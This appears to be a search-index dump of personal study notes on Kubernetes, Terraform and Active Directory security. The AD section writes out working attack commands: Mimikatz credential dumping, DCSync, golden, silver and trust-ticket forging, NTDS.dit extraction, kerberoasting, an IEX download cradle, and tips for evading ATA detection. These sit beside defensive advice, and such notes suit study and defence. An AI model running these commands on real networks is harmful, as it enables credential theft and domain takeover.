config view kubectl config use - context mycontext Now new user can kubectl get all Only allowed to access the namespace defined in role . If all-namespaces should be visible use ClusterRole and ClusterRoleBinding . Grant limited permission across cluster. Then use Role section to grant wider permissions on own-cluster. ServiceAccount in RoleBinding is used to grant access to one pod from another. ConfigMap Env variables are unmanageable and may get duplicated, leaving multiple places to change kubectl get cm kubectl describe cm Using config map valueFrom - configMapKeyRef Still duplicates When updating: Create a new version of the config-map Change the name referenced envFrom - configMapKeyRef all key value paired copied volumeMount and volume - configMap Each value of map becomes the file name Secrets Just prevents you from accidentals printing secret when doing kubectl get secrets No encryption RBAC can be used to deny access to secrets while giving access to configMaps kubectl get secrets kubectl get secret - n monitoring example - o yaml kubectl get secret - n monitoring example - o json kubectl delete secret - n monitoring example - o json kubectl create secret - n monitoring example --from-file=example.yaml Hot Reloading of ConfigMaps Spring Cloud Kubernetes Demo: https://www.youtube.com/watch?v=DiJ0Na8rWvc t=563s Ingress Controllers Accessing Service NodePort - Alow defining port and exposing. Port 30,000 and above only. ClusterIP - Internal access only LoadBalancer - Provided by the cloud provider will require separate LB for each service LB talk to Ingress Controller (ex Nginx) and IC talk to services kubectl get ingress kubectl describe ingress minikube addons list minikube addons enable ingress https://kubernetes.github.io/ingress-nginx/ Batch Jobs Pod by default always restarts (restart policy) Designed to run to completion DaemonSet All nodes run a copy of these pods StatefulSet Pods have predictable names Startup in sequence Client can address by name Example: Primary secondary situation - OpenFaaS Kubeless OpenWisk - GitLab TravisCI CircleCI - Promethius Fluentd OpenTracing Jeager - Istio LinkerD Consul - Teraform Helma","title":"Notes"},{"location":"devops/kubernetes/#tools","text":"Kubernetes RBAC static Analysis visualisation tool: https://github.com/appvia/krane","title":"Tools"},{"location":"devops/kubernetes/#security-validations","text":"For internal services, use ClusterIP service-type. (instead of NodePort ) In production all use ClusterIP ?? Are pods stateless? Are resource requests and limits defined properly. kubectl describe node minikube (cluster node). Allocatable and Capacity . If Java 10 is used of RAM is taken for Xmx by default ( - Xmx50m ) Readiness Probe / Liveness Probe defined properly kubectl config view --minify to get password of cluster admin user/password. usable to login to cluster API and all services deployed in the cluster including AlertManager : / api / v1 / namespaces / / api / v1 / namespaces / monitoring / services / api / v1 / namespaces / monitoring / services / alert - manager - operated : 9093 / proxy Prometheus: https://prometheus.io/docs/operating/security/ Audit RBAC configuration API groups are defined properly without using * Check ClusterRole for cluster wide permissions K8s API only accepts requests signed by CA within the k8s cluster Make sure cluster key is stored securely. kops : KOPS_STATE_STORE (s3 bucket) contains this. cluster_folder / pki / private / ca / number . key and pki / issued / ca / number . crt . aws s3 ls s3 : // storage - name / example . local / pki / private / ca / number . key aws s3 cp s3 : // storage - name / example . local / pki / private / ca / number . key kubernetes . key aws s3 cp s3 : // storage - name / example . local / pki / issued / ca / number . crt","title":"Security Validations"},{"location":"devops/kubernetes/#cluster-api","text":"Bring declarative k8s style APIs to cluster creation, configuration and management.","title":"Cluster API"},{"location":"devops/kubernetes/#new-references","text":"https://github.com/Salaboy/orchestrating-cloud-events Understanding Kubernetes limits and requests by example: https://sysdig.com/blog/kubernetes-limits-requests/ Understanding Kubernetes pod evicted and scheduling problems: https://sysdig.com/blog/kubernetes-pod-evicted/ How to troubleshoot Kubernetes OOM and CPU Throttle: https://sysdig.com/blog/troubleshoot-kubernetes-oom/","title":"New References"},{"location":"devops/kubernetes/#teraform","text":"Server provisioning Two steps: Initialize: terraform init Validate: terraform validate Plan: terraform plan Execute: teraform apply terraform console Resources are referenced as . : Example: aws_s3_bucket . my_s3_bucket Types: resource output variable lists maps provisioner connection terfaform . tfstate terfaform . tfstate . backup and .teraform must not be commited. Contains secrets in plain text. When state needs to be shared, store the state inside a Remote Backend . Create multiple resources: count = 2 \\n name= my_user_ ${ count . index } teraform show teraform fmt Assign to variable from environment variables: TF_VAR_ variable_name = value Best Practice: Create separate projects for resources that might have similar lifecycle. One application would have multiple projects. Best Practice: Use immutable servers - Once you provision a server and a change is required, just remove the old server and prosition a new one. Do not do tweeks. Make things dynamic: aws_default_vpc special resources that is not created / destroyed by Teraform. data_provider aws_subnet_ids to get list of subnets within the VPC aws_security_group data_provider aws_ami aws_ami_ids (most_recent: true) teraform graph - Graphwiz Storing state into S3 Create S3 bucket: lifecycle, versioning, server_side_encryption_configuration Create aws_dynamodb_table for locks: Attribute(LockID/S) terraform - backend \"s3\" - point to s3 and dynamodb.. name should be unique: application/project/type/envitronment application_name, project_name, environment can be variables Workspaces Track multiple environments teraform workspace show teraform workspace list teraform workspace new prod - env teraform workspace select prod - env Use ${ teraform . workspace } to add the workspace name to resources Modules Create teraform - modules dir and in it create modules for different resources Create dev prod folders. In these folders in main.tf add variable for environment. module user_module { source = ../../teraform-modules/users environment = dev } brew install terraform terraform -- version terraform version terraform init export AWS_ACCESS_KEY_ID =******* export AWS_SECRET_ACCESS_KEY =********* terraform plan terraform console terraform apply - refresh = false terraform plan - out iam . tfplan terraform apply iam.tfplan terraform apply - target = aws_iam_user . my_iam_user terraform destroy terraform validate terraform fmt terraform show export TF_VAR_iam_user_name_prefix = FROM_ENV_VARIABLE_IAM_PREFIX export TF_VAR_iam_user_name_prefix = FROM_ENV_VARIABLE_IAM_PREFIX terraform plan - refresh = false - var = iam_user_name_prefix=VALUE_FROM_COMMAND_LINE terraform apply - target = aws_default_vpc . default terraform apply - target = data . aws_subnet_ids . default_subnets terraform apply - target = data . aws_ami_ids . aws_linux_2_latest_ids terraform apply - target = data . aws_ami . aws_linux_2_latest terraform workspace show terraform workspace new prod - env terraform workspace select default terraform workspace list terraform workspace select prod - env","title":"Teraform"},{"location":"devops/kubernetes/#networking","text":"Flannel Calico Canel = Flannel + Network Policy (Calico) Weave CNI has less performance than VXLAN Azure Network CNI plugin IPSec","title":"Networking"},{"location":"devops/kubernetes/#security","text":"Layer 0 - Kernel Check allowed syscalls and restrict Improve sandbox with gViser Kata container AWS Firecracker Keep kernel updated Layer 1 - The container Build Remove unnecessary tools Lightweight image Scan images Known sources Check integrity Run Epherminal containers for live debugging (never exec into running container) Hook into running container and watch for anomalies EBPF sysdig falko Layer 2 - The workloads Pod security context","title":"Security"},{"location":"windows/active-directory/","text":"Active Directory Quick References https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet Active Directory Kill Chain Attack Defense Active Directory Penetration Testing Checklist: https://gbhackers.com/active-directory-penetration-testing-checklist/?fbclid=IwAR0sd1LYx9O-w8PCXuQDO7NZHDe8YnJC0aJllppl6Jr0nf9gGWZ8qoTaKc8 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10 ) Introduction Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. These antiquated AD designs only focused on the: Directory information tree Delegation model Group Policy Objects (GPOs) structure and accounts management Securing privileged access - Active Directory administrative tier model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material Kerberos v5 used from Windows Server 2000+ Naming conventions User Principal name: winsaafman @scriptdotsh . local DN (Distinguished Names) LDAP names: CN = winsaafman , DC = corp , DC = scriptdotsh , DC = local CN = Common name OU = Organisational Unit DC = Domain Components Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller Structure Forest - Security boundary, which may contain multiple domains and each domain may contain multiple OU s https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10) https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10) Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker ( KCC ) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container SYSVOL Ref: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx Folder which resides on each and every domain controller within the domain . Contains the domains public files that need to be accessed by clients and kept synchronised between domain controllers. Default location is C : \\ Windows \\ SYSVOL The SYSVOL folder can be accessed through: share \\\\ domainname . com \\ sysvol or the local share name on the server \\\\ servername \\ sysvol . Uses DFS to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system. File Replication Service - FRS is a multi-master, multi-threaded replication technology. Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds) Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher Auto-healing functions in place to remedy some of the issues that FRS Instead of replicating entire files we only replicate the chunks of data that have changed Based on MD4 hash of the file The log contains information about the file and the time it was changed , this is then used to build its change message . To ensure the file and all it \u2019 s attributes ( i . e . permissions ) are kept intact FRS calls the backup [ API ] ( http : // social . technet . microsoft . com / wiki / contents / articles / 20580 . wiki - glossary - of - technology - acronyms . aspx # API ) which uses [ VSS ] ( http : // social . technet . microsoft . com / wiki / contents / articles / 20580 . wiki - glossary - of - technology - acronyms . aspx # VSS ) technology to take a snapshot of the file and it \u2019 s attributes . This backup file is then compressed and stored in the staging area folder . At this point the outbound log is updated ( again this is actually a table within the FRS database ) . This contains information about all the changes for a specified replication set . If in step 1 a file was deleted rather than created then we don \u2019 t create a staging file , but the outbound log reflects the deletion . FRS on DC1 then sends a change notification to its replication partner DC2 . DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1 . DC2 then copies the file from DC1 into its staging area . It then writes an entry to its outbound log to allow other partners to pickup the change . DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder . So there you have it , FRS replication . There is a very detailed and in - depth reference guide on TechNet [ here ] ( http : // technet . microsoft . com / en - us / library / cc758169 ( v = WS . 10 ) . aspx ) for further reference . Detect Firewall Blocking AD https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/ PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block Can ignore UDP 389 and UDP 88 messages TCP 42 errors, that just means WINS is not running on the target server AD Trust Types Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Trust Type Property Trust Direction Auth. Details Tree-Root Transitive Two-way Kerberos V5 or NTLM Created automatically when a new Tree is added to a forest. Parent-Child Transitive Two-way Kerberos V5 or NTLM Created automatically when a child domain is added. Shortcut Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used in a forest to shorten the trust path to improve authentication times. Forest Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used to share resources between AD DS forests. Kerberos Process Across Trust Boundaries Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png A client from Domain 1 wants to access the server located in Domain 2. A client from Domain1 requests a TGT from the DC1. DC1 responds back with the TGT (encrypted with krbtgt hash) Client shows the TGT and requests a TGS for accessing the server in Domain2. As DC1 doesn\u2019t find the server in current domain and realizes that the TGS needs to be issued by the DC2 (of Domain2) because the server is located in the Domain2. So it responds back to client with the Inter-realm TGT. Client shows the TGT encrypted with Inter-Realm trust key to DC2 in the Domain2 and requests TGS to access the server. DC2 sends back the TGS for Server encrypted with server\u2019s account hash. Client presents the TGS (encrypted with server\u2019s account hash) to the server for access. Scope of Authentication Forest-wide authentication - Users from the outside forest have the same level of access to resources in the local forest as users who belong to the local forest. Selective authentication - You need to manually assign permissions on each computer in the domain as well as the resources to which you want users in the second forest to have access (by editing ACE (Access control entry)). Setup Install-windowsfeature AD-domain-services Install-WindowsFeature RSAT-ADDS Import-Module ADDSDeployment Install-ADDSForest -CreateDnsDelegation : $false ` -DatabasePath C:\\Windows\\NTDS ` -DomainMode Win2012R2 ` -DomainName server1.hacklab.local ` -DomainNetbiosName server1 ` -ForestMode Win2012R2 ` -InstallDns : $true ` -LogPath C:\\Windows\\NTDS ` -NoRebootOnCompletion : $false ` -SysvolPath C:\\Windows\\SYSVOL ` -Force : $true Download VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ SysPrep When and How: https://thesolving.com/server-room/when-and-how-to-use-sysprep/ Add user net user user1 Passw0rd ! / ADD / DOMAIN New - ADUser - Name Winsaaf Man - DisplayName Winsaaf Man - SamAccountName \u201c winsaaf . man \u201d - UserPrincipalName \u201c winsaaf . man @scriptdotsh . local \u201d - GivenName \u201c winsaaf \u201d - Surname man - AccountPassword ( Read - host - AsSecureString \u201c Enter Password \u201d ) - Enabled $ true - server scriptdotsh . local More options: - ChangePasswordAtLogon $ false - PasswordNeverExpires $ true Bulk addition: https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions View users: net users / domain View group: net group / domain Domain Admins Tools Mimikatz Utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file lsadump :: dcsync / domain : pentestlab . local / all / csv lsadump :: dcsync / domain : pentestlab . local / user : test Executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process privilege :: debug lsadump :: lsa / inject CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) - u username - H LMHASH : NTHASH crackmapexec smb target ( s ) - u username - H NTHASH ldapsearch Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch -x -h $ip -p 389 -D SVC_TGS \u200b -w \u200b $password -b \u200b dc=active,dc=htb \u200b -s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname ldapdomaindump ldapdomaindump - u example \\ example 10 . 10 . 10 . 10 Impacket GetADUsers.py - Enumerate domain user accounts GetADUsers . py - all active . htb / svc_tgs - dc - ip $ ip Enumeration Tips: Run AD enumerations on each box you get access to. Tools Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be Scan: pingcastle . exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession Using PowerShell and Built-ins Works in Constrained Mode as well. https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll C : \\ Windows \\ Microsoft . NET \\ assembly \\ GAC_64 \\ Microsoft . ActiveDirectory . Management \\ Microsoft . ActiveDirectory . Management . dll Import-Module .\\ Microsoft . ActiveDirectory . Management . dll Domain: Get - ADDomain SID: Get - DomainSID = Get - ADDomain . DomainSID . Value Domain Controller: GET - ADDomainController Users: Get - ADUser - Filter * Get - ADUser - Filter * - Properties * Get - ADUser - Server pc1 . powershell . local Get - ADUser - Identity labuser Groups : Get - ADGroup - Filter * Get - ADGroup - Filter * | Select Name Get - ADGroup - Filter { Name - like *admin* } | Select Name Filter Groups for User: Get - ADGroup - Filter { Name - like *admin* } | select name , GroupScope Group Members: Get - ADGroupMember - Identity Domain Admins - Recursive Get - AdPrincipalGroupMembership - Identity labuser Computers: Get - AdComputer - Filter * - Properties * ACL for AD objects: (without resolving GUIDs) ( Get - Acl AD:\\CN=labuser,CN=Users,DC=example,DC=powershell,DC=local ). Access Trust Get - AdTrust - Filter * Get - AdTrust - Filter * - Identify example . powershell . local Forest: Get - ADForest Get - ADForest - Identify powershell . local Get all domains in current forest: ( Get - ADForest ). Domains Forest Trust Get - ADTrust - Filter msDS-TrustForestTrustInfo -ne $null PowerView . / PowerView . ps1 - Current domain information: Get - NetDomain - Domain information: Get - NetDomain - Domain powershell . local (info of domains where there is a trust relationship) - Domain Controller: Get - NetDomainController - Users: - Get - NetUser - Get - NetUser - Domain powershell . local - Get - NetUser - UserName labuser - Groups: - Get - NetGroup - Get - NetGroup * admin * - Group Members: - Get - NetGroupMembers - GroupName Domain Admins - Get - NetGroup - UserName labuser - Check if current user context has local-admin access to hosts in the domain: Find - LocalAdminAccess - Verbose - Enumerate members of local-admin groups across all machines: Invoke - EnumerateLocalAdmin - Verbose - 2016+ responded only by boxes where current user have local-admin access - Computers: Get - NetComputer - FullData - Sessions: - Get - NetSession - List sessions on a computer: Get - NetSession - ComputerName pc1 - Find computers where domain admin is logged in and current user has access: Invoke - UserHunter - CheckAccess - Based on list of machines from DC - List of sessions - Logged on users from each machine - Shares (?) - ACL for AD objects: - Get - ObjectAcl - Get - ObjectAcl - SamAccountName labuser - ResolveGUIDs - Get - ObjectACL - AdSprefix CN=Administrator,CN=Users - Verbose - Look for all interesting ACL entries: Invoke - ACLScanner - ResolveGUIDs (write modify) - Filter using IdentifyReference to identify what current user has interesting access to - Trust - Get - NetDomainTrust - Get - NetDomainTrust - Domain example . powershell . local - Forest: - Get - NetForest - Get - NetForest - Forest powershell . local - Get all domains in current forest: - Get - NetForestDomain - Get - NetForestDomain - Forest powershell . local - Forest Trust - Get - NetForestTrust - Get - NetForestTrust - Domain example . local powershell.exe -exec Bypass -C IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 ); Get-NetDomain Snapshot for Offline Analysis Using https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer Download: https://live.sysinternals.com/ UNC path: \\\\ live . sysinternals . com \\ tools Bloodhound Finds groups and group members of each group. Gets Domain computers in the domain. Obtain local admins for each computer. List Active sessions on each computer. And then creates relationships between all these findings. Attack Patterns Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Dumping AD Credentials secretsdump - Need domain admin credentials: secretsdump . py - just - dc - ntlm DOMAIN / USER @ DOMAIN_CONTROLLER NTDS.dit AD data stored in: %SYSTEMROOT%\\NTDS\\ntds.dit Cannot be copied directly to another location Can be extracted using Domain Controller Replication Services Native Windows Binaries WMI Backups / External Storage for DC VMWare / HyperV for virtual DCs VMWare admin can call virtual DC within VMWare Clone a DC and copy the storage file No events triggered NTDSUtil DC Promo has to copy from another DC But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit Can use NTDSUtil to create an IMF or look for IMF in network Extraction techniques and tools: https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes Steps: cmd.exe as Administrator ntdsutil snapshot activate instance NTDS create mount UUID copy NTDS.dit (located in Windows\\NTDS\\NTDS.dit by default) ntdsutil unmount UUID delete UUID quit quit reg.exe save HKLM\\SYSTEM path_where_you_want_to_save_it secretsdump.py -system path_to_system_hive -ntds path_to_ntds.dit LOCAL Dumping Credentials on DC - Mimikatz Take memory dump of LSASS process using task manager and use Mimikatz offline Run Mimikatz on DC Invoke-Mimikatz on DC via PS remoting Dumping Credentials on Multiple Machines - Mimikatz Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 ) Uses PowerShell remoting Hence need creds / administrative access to remote computers If remoting not enabled: If WIM enabled WIN32 Proess - Class Create Method (TODO:) WIN32 Service - Execute Method (TODO:) Pass the Hash Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf In typical scenario: User type the password LSASS hash the password (LM, NTLM) and send it to service for authentication In attack scenario: Attacker pass the hash (LM, NTML) itself to LSASS which is sent to service Preventions Disable NTML hashes \"Protected Users\" group Do not leave lot of NTLM authentication footprint in eventless Over Pass the Hash / Pass the Key Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf If NTLM hash is available, encrypt timestamp with hash and sent it to KDC in AS-REQ to get a TGT Keys are in: Client LSASS memory Prevented by \"Protected Users\" group Active Directory NTDS.dit and SYSTEM hive Offline [Tool] NTDSXtract python DSUser . py ntds . dit . export / datatable . 4 ntds . dit . export / link_table . 7 . / work - name Administrator --syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile ./nt --pwdformat john privilege :: debug sekurlsa :: ekeys Online privilege :: debug lsadump :: lsa / inject / name : Administrator Keys are in: DES RC4 - Non domain salted NTML hash AES128 AES256 keys (NT6+) Use PBKDF2 Salted 4096 iterations Cracking is difficult Over pass the hash privilege :: debug sekurlsa :: pth / user : Administrator / domain : DomainName / ntlm : Hash References http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/ Mimikatz Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe Pass the Ticket Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Inject the TGT in to the LSASS Kerberos Provider Do not ask the KDC for the TGT, instead ask the KDC to give us a TGS Can also inject TGS in to the LSASS Kerberos Provider Exporting from memory: API only allow exporting current user's tickets (your tickets) TGT: AllowTgtSessionKey reg-key must be set TGS: No restrictions http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage LsaCallAuthenticationPackage / KerbSubmitTicketMessage mimikatz kerberos :: list [ / export ] mimikatz kerberos :: ptt ticket For all users in LSASS memory: privilege :: debug sekurlsa :: tickets export kerberos : ptt ticket . kirbi Token Manipulation Invoke - TokenManipulation / Incognito for impersonation Admin privileges are required to adjust token prilileges Can also use Mimikatz New process with token of given user: Invoke - TokenManipulation - ImpresonateUser - Username domain/user New process with token of another process: Invoke - TokenManupulation - CreateProcess C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500 DCSyc Used to sync AD to Azure Can be used to get credentials from AD If reverse encryption is enabled for an account, clear text password can be obtained. Needs Administrator or Domain Controller rights By default, no logs since this is done through official RPC (remotely) Implemented by: Mimikatz (lsadump:dcsync), Impacket, DSInternals DCSync is easy to detected NRPC (NetLogon) When you have domain admin account for one DC, can as another DC to send all NTLM hashed of computer accounts and domain controller accounts. Can be used to create silver tickets. If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this. Microsoft Windows AD Kerberos Tickets Gather tickets GetUserSPNs . py - request ( HOST . DOMAIN ) / ( VALID SMB USER ):( USER PASSWORD ) Crack - a 0 - Straight cracking mode - m 13100 - Hashtype 13100 - which is Kerberos 5 TGS - REP etype 23 the kerberos . ticket file - w 3 - Suggested example workload setting for Hashcat .\\ hashcat64 . exe - m 13100 - a 0 C:\\Users\\weaknet\\Desktop\\Portfolio\\VMWare Shared\\kerberos.tick et -w 3 C :\\ Users \\ weaknet \\ Desktop \\ Portfolio \\ VMWare Shared \\ rockyou . txt hashcat ( v5 . 1 . 0 ) starting ... Privilege Escalation Across Domains Child to forest root Domain in same forest gave implicit two way trust with forest root There is a trust key bwterrn parent and child domains Inter - realm TGT Approaches Trust tickets Inter - realm TGT (sent along with request for TGS) to other DC is validated by Decrypting Inter - realm TGT with Trust Key If you have trust-key, you can forge trust-tickets On child domain, to get trust-key: Invoke - Mimikatz - Command lsadump::trust /patch FOrge inter-realm TGT: Invoke - Mimikatz - Command Kerberos::golden /domain:example.powershell.local /sid sid /sids: sid-history-of-enterprise-admin /rc4: rc4 /user:Administrator /service:kerbtgt /target:powershell.local /ticket:trust_tkt.kirbi Get TGS for a service using forged trust ticket: asktgs . exe trust_tht . kirbi CIFS / dc . parent . powershell . local Access kirbikator . exe lsa example . kirbi ls \\\\ dc . parent . powershell . local \\ c $ Krbtgt hash Similar to Golden Ticket Once you have kerbtgt hash of current domain, use SID history to forge a TGT: Invoke - Mimikatz - Command lsadump::lsa /patch Invoke - Mimikatz - Command Kerberos::golden /user:Adminsitator /domain:example.powershell.local /sid sid /krbtgt: hash /sids: sid-history-of-enterprise-admin /ticket:krb_tkt.kirbi On a machine in the other domain: Invoke - Mimikatz - Command kerberos:ppt krb_tkt.kirbi Persistence Golden Ticket A valud TGT signed and encrypted by the hash of krbtgt account User account validation is not done by DC (KDC service), until TGT is older than 20 minutes Can even delete / revoke accounts Krbtgt user hash could be used to impersonate any user with any privileges from even from a non-domain machine Single passwoed change has no effect on this attack (need two change operations) Why persistance technique? Once you have domain-admin, use it to extract all credentials Forge a TGT to get persistance Execute mimikatz on DC: Invoke - Mimikatz - Command lsadumo::lsa /patch - Computername ops - dc Patch the running lsa process (execute code on DC) Use DCSync to get krbtgt hash (when you have DA privilages for the domain): Invoke - Mimikatz - Command lsadump::dcsync /user:example\\krbtgt Without running code on DC On any machine: Invoke - Mimikatz - Command kerberos:golden /User:Administrator /domain:example.powershell.local /sid: domain_sid kerbtgt: hash /id:500 /group:513 /ppt Silver Ticket A valid TGS is encrypted and signed by the NTLM hash of serive account Less noisy. No communication with DC is required. Service rarely check PAC (Privileged Attribute Certificate) Services will allow access only yo the services themselves Allows access to a paticular service on a paticular machine Invoke - Mimikatz - Command kerberos:golden /domain:example.powershell.local /sid: domain_sid kerbtgt: hash /target:dc.example.powershell.local /service:cifs /rc4: rc4_of_service_account_for_cifs/machine_account /id:500 /user:Administrator /ppt Defense Do not allow or limit login of DAs to any other machines (other than DC) If it's necessary, there shouldn't be any other administrators on that machine Do not run services with DA account Monitor event ID 4624: Account logon 4634: Account logoff 4672: Admin logon 4769 - A kerberos ticket was requested Kerberos Mitigations Service account passwords should be hard to guess Use managed service accounts (auto change password and deligated SPN management) Detect kerberost: 4769 and Encryption type is RC4 Service account for kerberos ticket request is a service account Securing Trust Tickets SID filtering Avoid SID history abuse (DA from child to EA on forest root) Enabled by default on all inter-forest-trusts. Intra-forest trusts are assumed to be secured by default (forest is the security boundary) SID filtering can break applications and user access (hence, usually disabled) Selective Authentication Users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given ATA for Detecting Recon: Account enum. Netsession enum Compromised Credentials Attacks: Bruteforce, High privilege account/service account exposed in clear text, Honey token, usual protocol (NTLM and Kerberos) Credential/Hash/Ticket Replay attacks Bypassing ATA Avoid talking to the DC as long as possible Make appear the traffic we generate as attacker normal Example: Use AES keys when downgrades are detected Use unique and strong local admin account passwords Use Microsoft LAPS (Local Administrator Password Solution) to automate local admin password changes Centralized storage of passwords in AD with periodic randomizing where read permissions can be access controlled Storage in clear text, transmission is encrypted https://blog.netspi.com/running-laps-around-cleartext-passwords/ Use Privileged Adminsitratove Workstations (PAWs) Hardened workstation for performing sensitive tasks like domain administration and cloud infrastructure access Stratergies: Separate privilege and hardware for admin tasks Admin Jump servers to be accessed only from PAW Having a VM on a PAW for user tasks Administrative Tier Model Tier 0 - privileged access across the enterprise Tier 1 - access to resources with business value Tier 2 - access to resources with business value, that are hosted on user workstations and devices (Ex: Help Desk) https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material KB2871997 to disallow local account logon across the network https://technet.microsoft.com/library/security/2871997 Microsoft has definitely raised the bar: accounts that are members of the localgroup \u201cAdministrators\u201d are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it\u2019s renamed. Limit workstation to workstation communication Implement network segmentation Never run services with domain-admin privileged accounts on workstations (avoid dumping from LSASS) Install patch (), so that LSASS will not store plain text password Done't use unconstrained delegation (this stores user's delegated TGS in LSASS). Only use constrained delegation. Disable delegation for admin accounts (Check: Account is sensitive and cannot be delegated). Detect based on delegation events. Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be Implementing Least Privilege Model: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models Securing Privileged Access - Microsoft PS Paper - Best Practices of Securing Active Directory NetCease . ps1 to prevent session enumeration on AD computers References https://adsecurity.org/ Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ 